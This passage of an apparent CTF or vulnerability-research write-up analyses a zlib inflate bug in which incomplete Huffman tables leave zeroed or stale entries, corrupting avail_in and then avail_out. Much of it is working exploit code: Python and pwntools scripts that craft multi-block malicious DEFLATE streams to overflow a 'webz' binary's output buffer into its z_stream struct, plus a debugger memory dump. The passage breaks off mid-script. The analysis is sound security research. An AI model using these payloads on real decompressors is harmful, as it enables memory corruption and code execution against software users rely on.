        }&lt;/code&gt;&lt;p&gt;After the LZ77 copy, the code handles second-level table lookups and invalid codes.&lt;/p&gt;&lt;p&gt;We analyzed the principal parts of &lt;code&gt;Inflate&lt;/code&gt;, the decoder for &lt;code&gt;Deflate&lt;/code&gt;. Do you see the bug? Everything looks well designed.&lt;/p&gt;&lt;p&gt;There’s a subtle issue in the Huffman table construction. A Huffman table can be incomplete. For example, if &lt;code&gt;root&lt;/code&gt; is 8 and the maximum code length is 10, there will be no entries for length‑9 codes; i.e., some table entries remain unset. Are such NULL entries handled correctly during decoding?&lt;/p&gt;&lt;code&gt;// inflate.c
            if (here.op &amp;amp; 64) {
                strm-&amp;gt;msg = (z_const char *)"invalid literal/length code";
                state-&amp;gt;mode = BAD;
                break;
            }
...
            if (here.op &amp;amp; 64) {
                strm-&amp;gt;msg = (z_const char *)"invalid distance code";
                state-&amp;gt;mode = BAD;
                break;
            }

// inftrees.c
    if (huff != 0) {
        here.op = (unsigned char)64;            /* invalid code marker */
        here.bits = (unsigned char)(len - drop);
        here.val = (unsigned short)0;
        next[huff] = here;
    }&lt;/code&gt;&lt;p&gt;No. As we’ve seen, incomplete entries should be filled with &lt;code&gt;op=64&lt;/code&gt; (invalid).&lt;/p&gt;&lt;p&gt;As a result, any NULL entries get treated as if they were &lt;code&gt;code&lt;/code&gt; structures with &lt;code&gt;op=0, bits=0, val=0&lt;/code&gt;. Or, they may retain stale values from a previous block.&lt;/p&gt;&lt;p&gt;To achieve high speed, &lt;code&gt;inflate_fast&lt;/code&gt; omits many checks; it can therefore cause memory corruption when encountering incomplete Huffman tables. Let’s explore how.&lt;/p&gt;&lt;p&gt;The first memory bug identified was an integer overflow, but it wasn’t exploitable. The second was a stream overflow, which we ultimately exploited. We’ll describe both.&lt;/p&gt;&lt;p&gt;Let’s see what happens when a zero‑initialized table entry (&lt;code&gt;op=0, bits=0, val=0&lt;/code&gt;) is used in decoding.&lt;/p&gt;&lt;code&gt;      dolen:
        op = (unsigned)(here-&amp;gt;bits);
        hold &amp;gt;&amp;gt;= op;
        bits -= op;
        op = (unsigned)(here-&amp;gt;op);
        if (op == 0) {                          /* literal */
            Tracevv((stderr, here-&amp;gt;val &amp;gt;= 0x20 &amp;amp;&amp;amp; here-&amp;gt;val &amp;lt; 0x7f ?
                    "inflate:         literal '%c'\n" :
                    "inflate:         literal 0x%02x\n", here-&amp;gt;val));
            *out++ = (unsigned char)(here-&amp;gt;val);
        }&lt;/code&gt;&lt;p&gt;In the literal path, a &lt;code&gt;code&lt;/code&gt; with &lt;code&gt;op=0, bits=0, val=0&lt;/code&gt; consumes zero bits and decodes a null byte. Since no bits are consumed, &lt;code&gt;inflate_fast&lt;/code&gt; would loop forever decoding that same entry.&lt;/p&gt;&lt;code&gt;    } while (in &amp;lt; last &amp;amp;&amp;amp; out &amp;lt; end);&lt;/code&gt;&lt;p&gt;However, the loop is bounded by &lt;code&gt;out &amp;lt; end&lt;/code&gt;, so no overflow occurs here.&lt;/p&gt;&lt;code&gt;      dolen:
        op = (unsigned)(here-&amp;gt;bits);
        hold &amp;gt;&amp;gt;= op;
        bits -= op;
        ...
        else if (op &amp;amp; 16) {                     /* length base */
            len = (unsigned)(here-&amp;gt;val);
            op &amp;amp;= 15;                           /* number of extra bits */
            if (op) {
                if (bits &amp;lt; op) {
                    hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                    bits += 8;
                }
                len += (unsigned)hold &amp;amp; ((1U &amp;lt;&amp;lt; op) - 1);
                hold &amp;gt;&amp;gt;= op;
                bits -= op;
            }
            ...
        else if ((op &amp;amp; 64) == 0) {              /* 2nd level length code */
            here = lcode + here-&amp;gt;val + (hold &amp;amp; ((1U &amp;lt;&amp;lt; op) - 1));
            goto dolen;
        }&lt;/code&gt;&lt;p&gt;What about the length path? Because of the &lt;code&gt;op&lt;/code&gt; checks, the code falls into the second-level table lookup. With zero bits consumed, it indexes the 0th entry again.&lt;/p&gt;&lt;code&gt;          dodist:
            op = (unsigned)(here-&amp;gt;bits);
            hold &amp;gt;&amp;gt;= op;
            bits -= op;
            op = (unsigned)(here-&amp;gt;op);
            if (op &amp;amp; 16) {                      /* distance base */
                dist = (unsigned)(here-&amp;gt;val);
                op &amp;amp;= 15;                       /* number of extra bits */
                if (bits &amp;lt; op) {
                    hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                    bits += 8;
                    if (bits &amp;lt; op) {
                        hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                        bits += 8;
                    }
                }
            ....
            else if ((op &amp;amp; 64) == 0) {          /* 2nd level distance code */
                here = dcode + here-&amp;gt;val + (hold &amp;amp; ((1U &amp;lt;&amp;lt; op) - 1));
                goto dodist;
            }&lt;/code&gt;&lt;p&gt;Distance decoding behaves similarly, but worse: the second-level lookup jumps back into the distance decode path. The “0th table entry” behavior is dangerous, because the second-level lookup is designed to read a sub-table (with smaller &lt;code&gt;bits&lt;/code&gt;), but instead it’s indexing the primary table. &lt;code&gt;inflate_fast&lt;/code&gt; keeps at least 16 bits in &lt;code&gt;hold&lt;/code&gt; and assumes no codes exceed 15 bits, so it omits checks. The erroneous “0th entry” lookup breaks this assumption.&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Why are Huffman codes guaranteed ≤15 bits? Because the Code Huffman table itself can only encode lengths up to 15; longer lengths cannot be represented.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;Consider:&lt;/p&gt;&lt;code&gt;Bit buffer size: 16 (minimum present)
Primary table root: 10
Maximum Huffman code length: 12

1. Normal second-level distance lookup -&amp;gt; uninitialized entry `op=0, bits=0, val=0` (bits: 16 - 10 = 6)
2. Abnormal second-level lookup -&amp;gt; 0th primary-table entry (bits: 6 - 0 = 6)
3. Decoding the 0th primary-table entry (bits: 6 - 10 = -2)&lt;/code&gt;&lt;p&gt;As noted, the distance path jumps back into distance decoding after the second-level lookup, so the primary table (not sub-table) is indexed next, consuming too many bits. Ultimately, the &lt;code&gt;bits&lt;/code&gt; counter underflows—an integer overflow.&lt;/p&gt;&lt;code&gt;    /* return unused bytes (on entry, bits &amp;lt; 8, so in won't go too far back) */
    len = bits &amp;gt;&amp;gt; 3;
    in -= len;
    bits -= len &amp;lt;&amp;lt; 3;
    hold &amp;amp;= (1U &amp;lt;&amp;lt; bits) - 1;

    /* update state and return */
    strm-&amp;gt;next_in = in;
    strm-&amp;gt;next_out = out;
    strm-&amp;gt;avail_in = (unsigned)(in &amp;lt; last ? 5 + (last - in) : 5 - (in - last));
    strm-&amp;gt;avail_out = (unsigned)(out &amp;lt; end ?
                                 257 + (end - out) : 257 - (out - end));
    state-&amp;gt;hold = hold;
    state-&amp;gt;bits = bits;
    return;&lt;/code&gt;&lt;p&gt;At the end of &lt;code&gt;inflate_fast&lt;/code&gt;, the code adjusts &lt;code&gt;in&lt;/code&gt;/&lt;code&gt;avail_in&lt;/code&gt; by the number of unused bits. Thus, the integer overflow in &lt;code&gt;bits&lt;/code&gt; corrupts &lt;code&gt;strm-&amp;gt;next_in&lt;/code&gt; and &lt;code&gt;strm-&amp;gt;avail_in&lt;/code&gt;, affecting subsequent decoding.&lt;/p&gt;&lt;code&gt;import struct

class BitStream:
    """LSB-first bit stream writer."""
    def __init__(self):
        self.bits = 0
        self.bit_count = 0
        self.data = bytearray()

    def write_bits(self, value, num_bits):
        for i in range(num_bits):
            bit = (value &amp;gt;&amp;gt; i) &amp;amp; 1
            if bit:
                self.bits |= (1 &amp;lt;&amp;lt; self.bit_count)
            self.bit_count += 1
            if self.bit_count == 8:
                self.data.append(self.bits)
                self.bits = 0
                self.bit_count = 0

    def get_bytes(self):
        if self.bit_count &amp;gt; 0:
            self.data.append(self.bits)
        return self.data

def generate_huffman_codes_from_lengths(lengths):
    max_len = 0
    for length in lengths:
        if length &amp;gt; max_len:
            max_len = length
    
    if max_len == 0:
        return {}

    bl_count = [0] * (max_len + 1)
    for length in lengths:
        if length &amp;gt; 0:
            bl_count[length] += 1
    
    code = 0
    next_code = [0] * (max_len + 1)
    for bits_len in range(1, max_len + 1):
        code = (code + bl_count[bits_len - 1]) &amp;lt;&amp;lt; 1
        next_code[bits_len] = code

    huffman_codes = {}
    for i, length in enumerate(lengths):
        if length != 0:
            rev_code = int(f'{next_code[length]:0{length}b}'[::-1], 2)
            huffman_codes[i] = (rev_code, length)
            next_code[length] += 1
    
    return huffman_codes

lbase = [3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31, 35, 43, 51, 59, 67, 83, 99, 115, 131, 163, 195, 227, 258]
lext = [0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3, 3, 3, 4, 4, 4, 4, 5, 5, 5, 5, 0]
dbase = [1, 2, 3, 4, 5, 7, 9, 13, 17, 25, 33, 49, 65, 97, 129, 193, 257, 385, 513, 769, 1025, 1537, 2049, 3073, 4097, 6145, 8193, 12289, 16385, 24577]
dext = [0, 0, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6, 7, 7, 8, 8, 9, 9, 10, 10, 11, 11, 12, 12, 13, 13]
order = [16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15]

def find_len_sym(length):
    for i in range(len(lbase)):
        if lbase[i] &amp;gt; length:
            i -= 1
            break
    base_len = lbase[i]
    extra_bits = lext[i]
    extra_val = length - base_len
    return 257 + i, extra_bits, extra_val

def find_dist_sym(distance):
    for i in range(len(dbase)):
        if dbase[i] &amp;gt; distance:
            i -= 1
            break
    base_dist = dbase[i]
    extra_bits = dext[i]
    extra_val = distance - base_dist
    return i, extra_bits, extra_val

def encode_lengths_rle(lengths):
    encoded = []
    i = 0
    while i &amp;lt; len(lengths):
        current_len = lengths[i]
        
        if current_len == 0:
            count = 0
            while i + count &amp;lt; len(lengths) and lengths[i + count] == 0 and count &amp;lt; 138:
                count += 1
            if count &amp;gt;= 11:
                encoded.append((18, count - 11))
                i += count
                continue
            if count &amp;gt;= 3:
                encoded.append((17, count - 3))
                i += count
                continue

        if i &amp;gt; 0 and current_len == lengths[i - 1]:
            count = 0
            while i + count &amp;lt; len(lengths) and lengths[i + count] == current_len and count &amp;lt; 6:
                count += 1
            if count &amp;gt;= 3:
                encoded.append((16, count - 3))
                i += count
                continue

        encoded.append((current_len, None))
        i += 1
    return encoded

def create_dynamic_deflate_payload(stream, is_last, symbol_stream, ll_lengths, dist_lengths):
    
    nlen = max(i for i, length in enumerate(ll_lengths) if length &amp;gt; 0) + 1
    ndist = max(i for i, length in enumerate(dist_lengths) if length &amp;gt; 0) + 1
    
    all_lengths = ll_lengths[:nlen] + dist_lengths[:ndist]
    rle_encoded_lengths = encode_lengths_rle(all_lengths)
    
    rle_symbols = [item[0] for item in rle_encoded_lengths]
    code_symbol_freqs = {sym: rle_symbols.count(sym) for sym in set(rle_symbols)}
    
    code_table_lengths = [0] * 19
    for sym in code_symbol_freqs:
        code_table_lengths[sym] = 7
    
    ncode = max(i for i, length in enumerate(order) if code_table_lengths[length] &amp;gt; 0) + 1

    code_huffman_table = generate_huffman_codes_from_lengths(code_table_lengths)

    stream.write_bits(is_last, 1) # BFINAL
    stream.write_bits(2, 2) # BTYPE (10 for dynamic)

    stream.write_bits(nlen - 257, 5)
    stream.write_bits(ndist - 1, 5)
    stream.write_bits(ncode - 4, 4)

    for i in range(ncode):
        stream.write_bits(code_table_lengths[order[i]], 3)
        
    for sym, extra_val in rle_encoded_lengths:
        code, length = code_huffman_table[sym]
        stream.write_bits(code, length)
        if sym == 16: stream.write_bits(extra_val, 2)
        elif sym == 17: stream.write_bits(extra_val, 3)
        elif sym == 18: stream.write_bits(extra_val, 7)


    ll_huffman_table = generate_huffman_codes_from_lengths(ll_lengths)
    dist_huffman_table = generate_huffman_codes_from_lengths(dist_lengths)
    
    for type, val in symbol_stream:
        if type == 'LIT':
            code, length = ll_huffman_table[val]
            stream.write_bits(code, length)
        elif type == 'EOB':
            code, length = ll_huffman_table[val]
            stream.write_bits(code, length)
        elif type == 'LD':
            l, d = val
            len_sym, len_extra_bits, len_extra_val = find_len_sym(l)
            dist_sym, dist_extra_bits, dist_extra_val = find_dist_sym(d)
            
            code, length = ll_huffman_table[len_sym]
            stream.write_bits(code, length)
            if len_extra_bits &amp;gt; 0:
                stream.write_bits(len_extra_val, len_extra_bits)
            
            code, length = dist_huffman_table[dist_sym]
            stream.write_bits(code, length)
            if dist_extra_bits &amp;gt; 0:
                stream.write_bits(dist_extra_val, dist_extra_bits)
        elif type == 'INVALID':
            code, length = val
            stream.write_bits(code, length)


stream = BitStream()

# "AABCABC" -&amp;gt; 'A', 'A', 'B', 'C', (L=3, D=3), EOB
symbol_stream = [
    ('LIT', 65), ('LIT', 65), ('LIT', 66), ('LIT', 67),
    ('LD', (3, 3))
]

symbol_stream.append(("INVALID", (int('000000000000110'[::-1],2),15)))
symbol_stream.append(("INVALID", (int('000000001001'[::-1],2),12)))

symbol_stream.append(('EOB', 256))

for i in range(0,0x200):
    symbol_stream.append(('LIT', 65))

ll_lengths = [0] * 286
ll_lengths[65] = 15  # 'A'
ll_lengths[66] = 15  # 'B'
ll_lengths[67] = 15  # 'C'
ll_lengths[68] = 15  # 'D'
ll_lengths[69] = 15  # 'E'
ll_lengths[256] = 15 # EOB
ll_lengths[257] = 15 # Length 3

dist_lengths = [0] * 30
dist_lengths[2] = 10 # Distance 3
dist_lengths[3] = 10 # Distance 4
dist_lengths[4] = 12 # Distance 5

create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
payload = stream.get_bytes()

print(f"Generated DEFLATE payload ({len(payload)} bytes):")
print(payload.hex())

from pwn import *

p = process("./src/webz_asan")

def send_webz_payload(pay):
    MAX_AROUND_WIDTH_HEIGHT = p8(0x0) + p8(52) + p8(0x0) + p8(52) # MAX = 52, 52
    p.send(p32(len(pay)+12))
    p.send(b"WEBZ"+MAX_AROUND_WIDTH_HEIGHT+b"\x00\x00\x00\x00"+pay)

send_webz_payload(payload)

p.interactive()&lt;/code&gt;&lt;p&gt;We reproduce the case described above. The Distance table has &lt;code&gt;root=10&lt;/code&gt; with a maximum code length of 12, so there are unfilled entries with &lt;code&gt;op=0, bits=0, val=0&lt;/code&gt;. By crafting the stream to force a multilevel lookup, we can trigger the vulnerability.&lt;/p&gt;&lt;code&gt;    symbol_stream.append(("INVALID", (int('000000000000110'[::-1],2),15)))
    symbol_stream.append(("INVALID", (int('000000001001'[::-1],2),12)))&lt;/code&gt;&lt;p&gt;These are key. The first is a valid 15‑bit length code. The second is an invalid 12‑bit distance code.&lt;/p&gt;&lt;code&gt;dist_lengths[4] = 12 # Distance 5&lt;/code&gt;&lt;p&gt;The valid distance‑5 code is &lt;code&gt;000000001000&lt;/code&gt;. Instead, &lt;code&gt;000000001001&lt;/code&gt; forces a second‑level lookup that reads an uninitialized &lt;code&gt;code&lt;/code&gt; entry.&lt;/p&gt;&lt;p&gt;As a result, &lt;code&gt;next_in&lt;/code&gt;/&lt;code&gt;avail_in&lt;/code&gt; are corrupted.&lt;/p&gt;&lt;p&gt;However, this particular memory corruption was not exploitable. If we first decompress dummy data in block one, and then in a second block trigger the bug with a Literal/Length table that only contains EOB, we can corrupt &lt;code&gt;next_in&lt;/code&gt;/&lt;code&gt;avail_in&lt;/code&gt; without crashing. But since these are input stream variables (not output buffer variables), we couldn’t achieve an overflow or OOB write on the decompressed output buffer.&lt;/p&gt;&lt;p&gt;So what should we target to exploit uninitialized table entries? The most promising avenue in zlib is to abuse the copy routines. The stored-block copy and the LZ77 copy are powerful overwrite primitives—if we can disable the checks that constrain them.&lt;/p&gt;&lt;p&gt;In other words, we need to corrupt &lt;code&gt;avail_out&lt;/code&gt;, not &lt;code&gt;avail_in&lt;/code&gt;. Let’s inspect &lt;code&gt;inflate_fast&lt;/code&gt;’s LZ77 decode.&lt;/p&gt;&lt;code&gt;        else if (op &amp;amp; 16) {                     /* length base */
            len = (unsigned)(here-&amp;gt;val);
            op &amp;amp;= 15;                           /* number of extra bits */
            if (op) {
                if (bits &amp;lt; op) {
                    hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                    bits += 8;
                }
                len += (unsigned)hold &amp;amp; ((1U &amp;lt;&amp;lt; op) - 1);
                hold &amp;gt;&amp;gt;= op;
                bits -= op;
            }
            Tracevv((stderr, "inflate:         length %u\n", len));
            if (bits &amp;lt; 15) {
                hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                bits += 8;
                hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                bits += 8;
            }
            here = dcode + (hold &amp;amp; dmask);
          dodist:
            op = (unsigned)(here-&amp;gt;bits);
            hold &amp;gt;&amp;gt;= op;
            bits -= op;
            op = (unsigned)(here-&amp;gt;op);
            if (op &amp;amp; 16) {                      /* distance base */
                dist = (unsigned)(here-&amp;gt;val);
                op &amp;amp;= 15;                       /* number of extra bits */
                if (bits &amp;lt; op) {
                    hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                    bits += 8;
                    if (bits &amp;lt; op) {
                        hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                        bits += 8;
                    }
                }
                dist += (unsigned)hold &amp;amp; ((1U &amp;lt;&amp;lt; op) - 1);
#ifdef INFLATE_STRICT
                if (dist &amp;gt; dmax) {
                    strm-&amp;gt;msg = (z_const char *)"invalid distance too far back";
                    state-&amp;gt;mode = BAD;
                    break;
                }
#endif
                hold &amp;gt;&amp;gt;= op;
                bits -= op;
                Tracevv((stderr, "inflate:         distance %u\n", dist));&lt;/code&gt;&lt;p&gt;The LZ77 decode in &lt;code&gt;inflate_fast&lt;/code&gt; has almost no checks. The only guard is &lt;code&gt;if (dist &amp;gt; dmax)&lt;/code&gt;, behind &lt;code&gt;INFLATE_STRICT&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;How can it still be safe?&lt;/p&gt;&lt;code&gt;    static const unsigned short lbase[31] = { /* Length codes 257..285 base */
        3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31,
        35, 43, 51, 59, 67, 83, 99, 115, 131, 163, 195, 227, 258, 0, 0};
    static const unsigned short lext[31] = { /* Length codes 257..285 extra */
        16, 16, 16, 16, 16, 16, 16, 16, 17, 17, 17, 17, 18, 18, 18, 18,
        19, 19, 19, 19, 20, 20, 20, 20, 21, 21, 21, 21, 16, 73, 200};&lt;/code&gt;&lt;p&gt;The maximum copy length (LZ77 length) is &lt;code&gt;lbase[28] (258) + ((lext[28] (16) &amp;amp; 15) == 0)&lt;/code&gt; → 258. Earlier we noted that &lt;code&gt;inflate_fast&lt;/code&gt; is entered only when &lt;code&gt;strm-&amp;gt;avail_out &amp;gt;= 258&lt;/code&gt;, and the loop exits as soon as that’s no longer true. Thus, &lt;code&gt;inflate_fast&lt;/code&gt; can safely omit length checks because it guarantees there are at least 258 bytes of space.&lt;/p&gt;&lt;code&gt;            state-&amp;gt;next = state-&amp;gt;codes;
            state-&amp;gt;lencode = state-&amp;gt;distcode = (const code FAR *)(state-&amp;gt;next);
            state-&amp;gt;lenbits = 7;
            ret = inflate_table(CODES, state-&amp;gt;lens, 19, &amp;amp;(state-&amp;gt;next),
                                &amp;amp;(state-&amp;gt;lenbits), state-&amp;gt;work);&lt;/code&gt;&lt;p&gt;In &lt;code&gt;inflate&lt;/code&gt;, tables are written into &lt;code&gt;state-&amp;gt;codes&lt;/code&gt;, which is not cleared between blocks. The tables’ boundaries aren’t fixed either; &lt;code&gt;state-&amp;gt;next&lt;/code&gt; advances dynamically, so different blocks can lay out different tables at different offsets.&lt;/p&gt;&lt;p&gt;Therefore, stale entries from a previous block can persist in uninitialized slots of later tables—even of different types.&lt;/p&gt;&lt;p&gt;If a Distance-table entry from a previous block remains in an uninitialized slot of the subsequent Literal/Length table, we’re in trouble. Deflate limits lengths to 258, but distances can be much larger. If a stale Distance entry is misinterpreted as a Length entry in &lt;code&gt;inflate_fast&lt;/code&gt;, its length can exceed 258, breaking the invariant that made &lt;code&gt;inflate_fast&lt;/code&gt; safe.&lt;/p&gt;&lt;code&gt;    strm-&amp;gt;avail_out = (unsigned)(out &amp;lt; end ?
                                 257 + (end - out) : 257 - (out - end));&lt;/code&gt;&lt;p&gt;Ultimately, when the LZ77 decode interprets a stale Distance entry as a Length, &lt;code&gt;strm-&amp;gt;avail_out&lt;/code&gt; suffers an integer overflow. Unlike &lt;code&gt;avail_in&lt;/code&gt;, &lt;code&gt;avail_out&lt;/code&gt; reflects the remaining size of the output buffer, so this immediately leads to a buffer overflow.&lt;/p&gt;&lt;code&gt;#define MAX_INPUT_SIZE 4096
#define MAX_OUTPUT_SIZE (MAX_INPUT_SIZE * 2)

typedef struct EncodedWebz {
    uint8_t data[MAX_INPUT_SIZE];
    size_t size;
} EncodedWebz;

typedef struct DecodedWebz {
    uint8_t data[MAX_OUTPUT_SIZE];
    size_t size;
} DecodedWebz;

typedef struct WebzState {
    EncodedWebz encoded;
    DecodedWebz decoded;
    z_stream infstream;
    char ok_status[5];
} WebzState;

WebzState webz_state;&lt;/code&gt;&lt;p&gt;The decompressed bytes are written into the global &lt;code&gt;webz_state&lt;/code&gt; in &lt;code&gt;webz.c&lt;/code&gt;. To actually corrupt memory, we must write more than &lt;code&gt;8192&lt;/code&gt; bytes and overflow into the following &lt;code&gt;z_stream infstream&lt;/code&gt;, overwriting its fields.&lt;/p&gt;&lt;code&gt;stream = BitStream()

# STORED BLOCK ===============================================================================
stream.write_bits(0, 1) # BFINAL
stream.write_bits(0, 2) # BTYPE (0 for stored)
stream.bytebits()
stored_block_length = 0x200
stream.write_bits(stored_block_length + ( (stored_block_length ^ 0xffff) &amp;lt;&amp;lt; 16 ), 32) 
for i in range(0, stored_block_length):
    stream.write_bits(ord('X'), 8)
# STORED BLOCK ===============================================================================

# DYNAMIC BLOCK ==============================================================================
symbol_stream = [ ('EOB', 256) ]

ll_lengths = [0] * 286
ll_lengths[256] = 3 # EOB

dist_lengths = [0] * 30
for i in range(17,30):
    dist_lengths[i] = 15

create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
# DYNAMIC BLOCK ==============================================================================

# DYNAMIC BLOCK ==============================================================================
symbol_stream = []

symbol_stream.append(("INVALID", (8,10)))
symbol_stream.append(("INVALID", (0b1111111,7))) # extra bits
symbol_stream.append(("INVALID", (int('000'[::-1],2),3)))
symbol_stream.append(("INVALID", (0b1111111,7))) # extra bits
symbol_stream.append(('EOB', 256))
ll_lengths = [0] * 286
ll_lengths[256] = 10 # EOB
ll_lengths[257] = 10 # Length 3
ll_lengths[258] = 12 # Length 4

dist_lengths = [0] * 30
dist_lengths[17] = 3 # Distance ???

create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
# DYNAMIC BLOCK ==============================================================================

# STORED BLOCK ===============================================================================
stream.write_bits(0, 5) # dummy
stream.write_bits(0, 1) # BFINAL
stream.write_bits(0, 2) # BTYPE (0 for stored)
stream.bytebits()
stored_block_length = 0x10
stream.write_bits(stored_block_length + ( (stored_block_length ^ 0xffff) &amp;lt;&amp;lt; 16 ), 32) 
for i in range(0, stored_block_length):
    stream.write_bits(ord('C'), 8)
# STORED BLOCK ===============================================================================

# DYNAMIC BLOCK ==============================================================================
symbol_stream = []
symbol_stream.append(('LIT', 65))
for i in range(0,0x2ce):
    symbol_stream.append(('LD', (10, 1)))
for i in range(0,7):
    symbol_stream.append(('LIT', 65))
symbol_stream.append(('EOB', 256))

ll_lengths = [0] * 286
ll_lengths[65] = 3  # 'A'
ll_lengths[256] = 3 # EOB
ll_lengths[264] = 3 # Length 10

dist_lengths = [0] * 30
dist_lengths[0] = 3 # Distance 1


create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
# DYNAMIC BLOCK ==============================================================================

# STORED BLOCK ===============================================================================
overwrriten_infstream = b'X'*0x60

stream.write_bits(1, 1) # BFINAL
stream.write_bits(0, 2) # BTYPE (0 for stored)
stream.bytebits()
stored_block_length = len(overwrriten_infstream)
stream.write_bits(stored_block_length + ( (stored_block_length ^ 0xffff) &amp;lt;&amp;lt; 16 ), 32) 
for i in range(0, stored_block_length):
    stream.write_bits(overwrriten_infstream[i], 8)
# STORED BLOCK =============================================================================

"""
0x000064f4b0253370│+0x0000: 0x000064f4b02507de  →  0x0000000000000000
0x000064f4b0253378│+0x0008: 0x0000000000000000
0x000064f4b0253380│+0x0010: 0x0000000000000472
0x000064f4b0253388│+0x0018: 0x000064f4b0253370  →  0x000064f4b02507de  →  0x0000000000000000
0x000064f4b0253390│+0x0020: 0x00000000ffffe304  →  0x0000000000000000
0x000064f4b0253398│+0x0028: 0x0000000000002008
0x000064f4b02533a0│+0x0030: 0x000064f4b02533e0  →  0x0000000000000000
0x000064f4b02533a8│+0x0038: 0x0000000000000000
0x000064f4b02533b0│+0x0040: 0x000064f4af885820  →  &amp;lt;webz_alloc+0000&amp;gt; push rbp
0x000064f4b02533b8│+0x0048: 0x000064f4af8a3390  →  &amp;lt;zcfree+0000&amp;gt; push rbp
0x000064f4b02533c0│+0x0050: 0x0000000000000000
0x000064f4b02533c8│+0x0058: 0x0000000000000040 ("@"?)
"""

payload = stream.get_bytes()
print(f"Generated DEFLATE payload ({len(payload)} bytes):")

p = process("./webz")
#p = process("./src/webz_asan")

def send_webz_payload(pay):
    #MAX_AROUND_WIDTH_HEIGHT = p8(0x0) + p8(52) + p8(0x0) + p8(52) # MAX = 52, 52
    NORMAL_AROUND_WIDTH_HEIGHT = p8(0x0) + p8(52) + p8(0x0) + p8(5)
    p.send(p32(len(pay)+12))
    p.send(b"WEBZ"+NORMAL_AROUND_WIDTH_HEIGHT+b"\x00\x00\x00\x00"+pay)

raw_input()
send_webz_payload(payload)

p.interactive()&lt;/code&gt;&lt;p&gt;The PoC uses six blocks. Let’s walk through them.&lt;/p&gt;&lt;code&gt;# STORED BLOCK ===============================================================================
stream.write_bits(0, 1) # BFINAL
stream.write_bits(0, 2) # BTYPE (0 for stored)
stream.bytebits()
stored_block_length = 0x200
stream.write_bits(stored_block_length + ( (stored_block_length ^ 0xffff) &amp;lt;&amp;lt; 16 ), 32) 
for i in range(0, stored_block_length):
    stream.write_bits(ord('X'), 8)
# STORED BLOCK ===============================================================================&lt;/code&gt;&lt;p&gt;Block 1: writes dummy bytes to the output buffer so that later copies with large distances won’t misbehave.&lt;/p&gt;&lt;code&gt;# DYNAMIC BLOCK ==============================================================================
symbol_stream = [ ('EOB', 256) ]

ll_lengths = [0] * 286
ll_lengths[256] = 3 # EOB

dist_lengths = [0] * 30
for i in range(17,30):
    dist_lengths[i] = 15

create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
# DYNAMIC BLOCK ==============================================================================&lt;/code&gt;&lt;p&gt;Block 2: prepares the ground for the bug by filling the table area with Distance symbols. Those entries will persist in uninitialized slots later.&lt;/p&gt;&lt;code&gt;# DYNAMIC BLOCK ==============================================================================
symbol_stream = []

symbol_stream.append(("INVALID", (8,10)))
symbol_stream.append(("INVALID", (0b1111111,7))) # extra bits
symbol_stream.append(("INVALID", (int('000'[::-1],2),3)))
symbol_stream.append(("INVALID", (0b1111111,7))) # extra bits
symbol_stream.append(('EOB', 256))
ll_lengths = [0] * 286
ll_lengths[256] = 10 # EOB
ll_lengths[257] = 10 # Length 3
ll_lengths[258] = 12 # Length 4

dist_lengths = [0] * 30
dist_lengths[17] = 3 # Distance ???

create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
# DYNAMIC BLOCK ==============================================================================&lt;/code&gt;&lt;p&gt;Block 3: creates an incomplete Huffman table and references the uninitialized entry to perform LZ77 decoding. This actually triggers the bug and causes integer overflow in &lt;code&gt;avail_out&lt;/code&gt;. From this point on, boundary checks for the decompression buffer malfunction, enabling buffer overflow.&lt;/p&gt;&lt;code&gt;# STORED BLOCK ===============================================================================
stream.write_bits(0, 5) # dummy
stream.write_bits(0, 1) # BFINAL
stream.write_bits(0, 2) # BTYPE (0 for stored)
stream.bytebits()
stored_block_length = 0x10
stream.write_bits(stored_block_length + ( (stored_block_length ^ 0xffff) &amp;lt;&amp;lt; 16 ), 32) 
for i in range(0, stored_block_length):
    stream.write_bits(ord('C'), 8)
# STORED BLOCK ===============================================================================

# DYNAMIC BLOCK ==============================================================================
symbol_stream = []
symbol_stream.append(('LIT', 65))
for i in range(0,0x2ce):
    symbol_stream.append(('LD', (10, 1)))
for i in range(0,7):
    symbol_stream.append(('LIT', 65))
symbol_stream.append(('EOB', 256))

ll_lengths = [0] * 286
ll_lengths[65] = 3  # 'A'
ll_lengths[256] = 3 # EOB
ll_lengths[264] = 3 # Length 10

dist_lengths = [0] * 30
dist_lengths[0] = 3 # Distance 1


create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
# DYNAMIC BLOCK ==============================================================================&lt;/code&gt;&lt;p&gt;As noted, to overwrite &lt;code&gt;z_stream infstream&lt;/code&gt;, we must first fill the 8192‑byte output buffer. We use LZ77 and a stored block to push ~8120 bytes of padding.&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Due to padding/alignment within&lt;/p&gt;&lt;code&gt;WebzState&lt;/code&gt;, we need 8120 bytes (not 8192) to reach just before&lt;code&gt;z_stream infstream&lt;/code&gt;. Also, because the decompression buffer is larger than the compressed input limit, we use LZ77 to generate many output bytes from little input.&lt;/quote&gt;&lt;code&gt;# STORED BLOCK ===============================================================================
overwrriten_infstream = b'X'*0x60

stream.write_bits(1, 1) # BFINAL
